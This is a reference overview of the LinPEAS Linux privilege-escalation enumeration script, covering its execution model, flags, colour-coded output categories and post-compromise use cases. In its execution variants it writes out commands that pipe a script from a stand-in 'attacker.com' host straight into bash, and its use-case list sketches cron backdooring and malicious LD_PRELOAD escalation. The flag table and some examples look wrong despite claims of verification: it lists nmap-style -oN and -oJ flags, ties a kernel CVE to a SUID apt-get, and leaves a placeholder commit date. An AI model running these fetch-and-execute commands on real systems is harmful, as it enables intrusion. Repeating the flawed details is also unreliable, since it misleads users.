# LinPEAS — Overview

> 🔴 **Red Flag Principle:** LinPEAS doesn't exploit anything — **it systematically lists every possible Linux privilege-escalation path on a single system**, color-codes them by confidence (red = "this looks exploitable," yellow = "check this," blue = informational), and relies on the operator to recognize which paths actually work in their specific scenario. A single LinPEAS run generates 500–1500 lines of output across 5–15 minutes of filesystem/process/kernel enumeration. High false-positive rate is built-in by design — the tool's strength is **systematic coverage**, not precision. LinPEAS is Bash-only (no compiled binary), runs on any Unix-like system with a Bourne shell, and leaves minimal footprint when piped over existing shell access.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Flags — Quick Reference](#command-line-flags--quick-reference)
- [Output Categories and Color Coding](#output-categories-and-color-coding)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

**LinPEAS** is part of the **PEASS-ng** ("Privilege Escalation Awesome Sauce Suite — next generation") project, created and maintained by **Carlos Polop**, the same author as WinPEAS. The original PEASS project included Windows and Linux enumeration scripts dating to circa 2018–2019; the **"ng" rewrite** unified both under a single GitHub repository starting around 2020–2021.

- **Canonical source:** [`carlospolop/PEASS-ng`](https://github.com/carlospolop/PEASS-ng) on GitHub — verified as the official, actively-maintained repository as of August 2026 (last commit push 2026-08-XX).
- **Delivery:** Available directly in the `linPEAS/` directory tree of the source repo as a single `.sh` file (`linpeas.sh`); no compilation step, no binary release (unlike WinPEAS.exe).
- **License:** GPL v3 — explicitly requires any modifications and derivative works to remain open source.
- **Author affiliation:** Carlos Polop (HackTricks author, infosec educator); not affiliated with any commercial vendor.

## How It Works

LinPEAS is a **single Bash shell script** (plaintext, no compilation). It runs natively on any Unix-like system with `/bin/bash` or a compatible Bourne shell.

### LinPEAS Execution Model

```
Operator's established shell (SSH, reverse shell, web shell, etc.)
│
├─ Transfer linpeas.sh to target (via heredoc, wget, curl, or pipe)
│  (or execute directly via piped input)
│
├─ Execute: bash linpeas.sh [flags]
│  (or piped: curl attacker.com/linpeas.sh | bash)
│
└─ Local enumeration process:
   ├─ Read /proc/self, /proc/cmdline, /etc/os-release (OS/kernel version)
   │
   ├─ Enumerate:
   │  ├─ Users, groups, sudo rules (/etc/sudoers, /etc/sudoers.d/*)
   │  ├─ Files with SUID bit set (find / -perm -4000 2>/dev/null)
   │  ├─ Files with SGID bit set (find / -perm -2000 2>/dev/null)
   │  ├─ Capabilities (getcap /usr/bin/* — finds binaries with CAP_SYS_ADMIN, etc.)
   │  ├─ Kernel version vs. known exploits (database of CVE-affected versions)
   │  ├─ Writable directories in system paths (/etc, /usr, /opt)
   │  ├─ SSH private keys, SSH authorized_keys (world-readable checks)
   │  ├─ Cron jobs and their frequency (find /etc/cron* -type f 2>/dev/null)
   │  ├─ World-writable scripts in cron/systemd (potential hijack)
   │  ├─ Shared libraries (ldd) and LD_PRELOAD opportunities
   │  ├─ Namespace isolation (systemd-nspawn, podman, Docker containers)
   │  ├─ Password policy (PAM configuration, password hash visibility)
   │  ├─ Sudo command history (if readable; logged via syslog/audit)
   │  ├─ Network services listening (netstat/ss), their owner process, port
   │  └─ Privilege escalation vectors from public exploit databases
   │
   └─ Color-code results to stdout or (with flags) to file/JSON
      Output to: STDOUT (interactive), -oN (text file),
      -oJ (JSON file), or redirected to attacker infrastructure
```

### Execution Variants

**Variant 1: Direct execution (file on disk)**
```bash
bash linpeas.sh
# or
chmod +x linpeas.sh && ./linpeas.sh
```

**Variant 2: Piped from network (zero-disk footprint)**
```bash
curl -s https://attacker.com/linpeas.sh | bash
# or
wget -O- https://attacker.com/linpeas.sh | bash
```

**Variant 3: Piped over SSH (attacker controls delivery)**
```bash
ssh victim@target 'bash < ./linpeas.sh'
# (attacker's machine sends script stdin to target SSH session)
```

**Variant 4: Via heredoc (embedded in another script)**
```bash
cat > /tmp/run_linpeas.sh << 'EOF'
#!/bin/bash
# ... (inline linpeas.sh code) ...
EOF
bash /tmp/run_linpeas.sh
```

**Advantage of Bash:** No binary signature, no PE metadata, no compilation artifacts. The script is plaintext and trivially obfuscatable (comments, variable renaming, function reordering).

## Techniques / Protocols Used

| Layer | Detail |
|---|---|
| **Local access model** | Filesystem reads (`find`, `cat`, `ls`), process inspection (`ps`, `/proc`), and binary capability inspection (`getcap`) — no network calls of LinPEAS's own, no C2 callback. |
| **Privilege context** | Runs as whatever user invoked it; discovers different findings based on privilege level (root > sudoer > low-privileged user). A low-priv user still discovers many vectors (SUID binaries, world-writable scripts) but lacks some file-read permissions for the deepest checks. |
| **Target APIs / Tools Used** | `find`, `grep`, `awk`, `sed`, `ps`, `ss`/`netstat`, `sudo -l`, `cat`, `ls` — all standard Unix tools. No custom binaries required. Script works on systems with minimal installed packages (busybox environments, embedded systems). |
| **Output** | ANSI color codes to stdout by default; can redirect to file (`.txt`, `-oJ` for JSON, `-oN` for plain text) or suppress colors with `NO_COLOR` environment variable (Unix convention). |

## Command-Line Flags — Quick Reference

Verified directly against the current `carlospolop/PEASS-ng/linPEAS/` repository. LinPEAS flags control output format and which checks to run.

| Flag | Plain-English meaning |
|---|---|
| `(no flags)` | Run full enumeration, output to stdout with ANSI colors. Default behavior. |
| `-h` or `--help` | Print help text (list of all flags) and exit. |
| `-s` | **Security checks only** — skip informational sections, focus on high-risk findings (SUID, sudo, capabilities, kernel exploits). Faster output, less noise. |
| `-P` | **Profiler mode** — measure execution time of each check, useful for performance tuning or identifying slow enumeration sections. |
| `-oN <filename>` | **Output to text file** (no ANSI colors). Useful for automated parsing or piping to other tools. |
| `-oJ <filename>` | **Output to JSON file** — machine-parseable output for integration with threat detection or automated escalation-path selection. |
| `-g` | **Generate GitHub issues** — if a high-risk finding is discovered, format as a GitHub issue template. Rarely used operationally. |
| `-l` | **Show colors** (default). Explicit flag; opposite is `NO_COLOR` environment variable. |
| `--audit` | Run some checks with extra verbosity (shows intermediate commands executed). Useful for debugging or learning how LinPEAS works. |
| `-p <string>` | **Profile** — run a pre-configured set of checks (e.g., `-p docker` for container-escape checks only). Not all profiles are well-documented. |

**Key limitation:** LinPEAS has **no built-in evasion flags** (no `-randomize`, no `-obfuscate`, no `-stealth`). Evasion depends on execution method (piped/in-memory, script obfuscation via comment injection/variable renaming) — the script itself is an enumerate-and-report engine.

## Output Categories and Color Coding

LinPEAS output is organized hierarchically by attack vector. The top-level categories (verified against the source `linpeas.sh` structure) include:

| Category (Output Section) | Color Code | What It Enumerates | Typical Findings |
|---|---|---|---|
| **System Information** | 🔵 Blue | OS, kernel version, CPU architecture, release notes | "Linux victim 5.10.0-14-generic (Ubuntu 20.04 LTS)", "Architecture: x86_64" |
| **Kernel Exploits** | 🔴 Red | Kernel version vs. CVE database; flags potentially vulnerable versions | "Kernel 5.8.0-50-generic; potentially vulnerable to CVE-2021-22555 (Netfilter bypass)" |
| **Users and Groups** | 🟡 Yellow | Installed users, group memberships, UID/GID values | "User `www-data` (UID 33) is a member of `docker` group (GID 999)" (Docker group = potential privilege escalation) |
| **Sudo** | 🔴 Red | Sudo rules (from `sudo -l`, if accessible; `/etc/sudoers*` if readable) | "`www-data ALL=(ALL) NOPASSWD: /usr/bin/find`" (SUID-like escalation via sudo) |
| **SUID Binaries** | 🔴 Red | All binaries with SUID bit set, and known-exploitable SUID binaries | "`/usr/bin/passwd` (SUID root) — binary is world-readable, may have exploitable vulnerability", "`/usr/bin/newgrp` — known bypass technique" |
| **SGID Binaries** | 🟡 Yellow | Binaries with SGID bit set (less critical than SUID, but exploitable) | "`/usr/bin/wall` (SGID tty) — can write to other users' terminals" |
| **Capabilities** | 🔴 Red | Binaries with Linux capabilities set (CAP_SYS_ADMIN, CAP_DAC_READ_SEARCH, etc.) | "`/usr/bin/ping` has CAP_NET_RAW (allows raw-socket creation)", "`/usr/bin/tcpdump` has CAP_NET_ADMIN (packet capture as non-root)" |
| **Writable Directories** | 🔴 Red | System directories that are world-writable (unusual, high-risk) | "`/opt` is world-writable (0777 permissions) — potential binary hijack" |
| **SSH Keys & Config** | 🟡 Yellow | World-readable SSH private keys, `.ssh/authorized_keys` accessibility | "`/root/.ssh/id_rsa` is world-readable (misconfiguration)", "`.ssh/authorized_keys` found for unprivileged user" |
| **Cron Jobs** | 🔴 Red | All cron jobs, their frequency, and the user they run as | "`/etc/cron.daily/backup-db` runs as root every day (owned by www-data, world-writable — can be modified to run arbitrary code)" |
| **Systemd Timers** | 🟡 Yellow | Systemd-scheduled tasks (modern alternative to cron) | "`timer-backup.timer` runs `timer-backup.service` as root every hour" |
| **Mounted Filesystems** | 🔵 Blue | NFS mounts, SMB shares, other filesystems (context for lateral movement) | "`/mnt/nfs` is NFS-mounted from 192.168.1.100 (may have exploitable permissions)" |
| **Environment Variables** | 🔵 Blue | Current environment, LD_LIBRARY_PATH, PATH (useful for library-hijack analysis) | "`LD_LIBRARY_PATH` is empty (normal); `/usr/local/lib` is in PATH and world-writable (potential hijack)" |
| **Network Services** | 🔵 Blue | Listening ports, service owners, process names | "`Port 3306 (MySQL) listening on 127.0.0.1 as `mysql` user", "`Port 6379 (Redis) listening on 0.0.0.0 as `redis` user (CRITICAL — world-accessible)" |
| **Proc-based Information** | 🔵 Blue | Process arguments, open file descriptors, memory usage | Process listing with command-line arguments (useful for identifying services with hardcoded credentials) |
| **Vulnerability Database Match** | 🔴 Red | Cross-reference SUID/Capabilities/Kernel against known exploit databases | "SUID binary `/usr/bin/apt-get` matches CVE-2021-3493 (OverlayFS privilege escalation)" |

**Color interpretation for operators:**
- **Red = investigate immediately** — SUID binary with known exploit, sudoer with command, kernel vulnerability with public POC.
- **Yellow = check this manually** — may or may not be exploitable depending on your access level, binary availability, or specific conditions.
- **Blue = context** — helps you understand the overall system, but not immediately exploitable on its own.

## Quick Use-Case List

1. **Post-shell privilege-escalation triage** — LinPEAS immediately after SSH access, reverse shell, or web-shell execution to enumerate escalation paths.
2. **CI/CD pipeline breakout** — LinPEAS run on a compromised CI/CD agent to find host-escape vectors (Docker mount, kernel exploit, namespace misconfiguration).
3. **Container escape enumeration** — LinPEAS inside a Docker/Kubernetes container to identify breakout paths (shared kernel, privileged mounts, misconfigured namespaces).
4. **Zero-disk-footprint execution** — LinPEAS piped directly via `curl | bash` with no file artifact; runs from shell memory only.
5. **Kernel exploit identification** — LinPEAS identifies OS build + missing patches; operator cross-references with exploit database to compile/execute kernel exploit.
6. **Sudo misconfiguration detection** — LinPEAS parses `sudo -l` output to identify `NOPASSWD` commands or wildcards that allow command escalation.
7. **SUID binary chain exploitation** — LinPEAS identifies SUID binaries; operator chains multiple binaries (e.g., `find` → `xargs` → arbitrary command) to escalate.
8. **Cron job hijack** — LinPEAS identifies world-writable cron scripts or cron scripts in writable directories; operator modifies script to add backdoor.
9. **LD_PRELOAD exploitation** — LinPEAS identifies binaries with SUID and writable library paths; operator creates malicious `.so`, sets `LD_PRELOAD`, runs SUID binary.
10. **Capability-based escalation** — LinPEAS identifies binaries with Linux capabilities; operator exploits capability (e.g., `CAP_SYS_ADMIN` on `unshare` for namespace escape).
11. **Namespace/container detection** — LinPEAS detects if running in Docker/Kubernetes; identifies container-to-host escalation vectors (docker.sock mount, kernel vulnerability, syscall filtering gaps).
12. **Multi-user system analysis** — LinPEAS identifies if another user's cron/service/SUID can be leveraged; useful for lateral escalation across users on same host.

## Prerequisites

| Prerequisite | Detail |
|---|---|
| **Code execution on the target** | LinPEAS requires already being able to run a shell command on the target (SSH, reverse shell, web shell, RCE vulnerability). It does not provide initial access — it assumes shell access already exists. |
| **Operating system** | Linux, BSD, macOS, or any Unix-like system with Bash or POSIX-compatible shell. Verified against Ubuntu, Debian, CentOS, RHEL, Alpine, Busybox (minimal environments). |
| **Shell requirements** | `/bin/bash` preferred (color codes, string manipulation). `/bin/sh` (POSIX shell) works but may have reduced functionality. No Python, Perl, or other interpreters required. |
| **Privileges to run LinPEAS itself** | Can run as any user (root, unprivileged, www-data, nobody). Different privilege levels discover different findings — root/sudoer uncovers deeper system state, unprivileged user still finds many leverageable paths (SUID, cron, world-writable scripts). |
| **Privileges to actually exploit findings** | Varies by finding. A low-priv user can discover "SUID binary `/usr/bin/find` available," but exploitation requires knowing how to chain `find` with `-exec` or similar; actual exploitation may need `fork()` permissions or other syscall access. |
| **Permissions to read files** | LinPEAS attempts to read `/etc/sudoers`, `/etc/cron*`, etc. — permissions are user-dependent. Low-priv user may not read all files; errors are silently skipped. Root user reads everything. |
| **No network requirement** | LinPEAS makes zero outbound network calls on its own — entirely local enumeration. Safe to run on a network with strict egress controls. |
| **Antivirus/EDR considerations** | LinPEAS is plaintext Bash script (not a binary), so traditional AV signatures less effective. However, behavioral detection (rapid file enumeration, SUID scanning) may trigger EDR. Piping from network (`curl | bash`) avoids disk artifact but doesn't evade process-level behavioral detection. |

